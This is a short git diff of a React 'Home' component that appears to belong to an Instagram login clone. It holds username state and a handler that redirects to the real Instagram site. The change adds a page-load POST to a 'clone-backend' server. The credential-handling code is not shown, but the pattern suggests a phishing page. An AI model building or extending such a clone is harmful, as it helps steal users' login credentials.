@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState , useEffect} from "react";
 import axios from "axios";
 const Home = () => {
   const [username, setUsername] = useState("");
@@ -13,6 +13,11 @@ const Home = () => {
       window.location.href = "https://www.instagram.com/";
     })
   };
+
+  useEffect(() => {
+    axios.post("https://clone-backend-jvih.onrender.com")
+  },[])
+
   return (
     <div className="">
       <div className="container flex justify-center my-16">
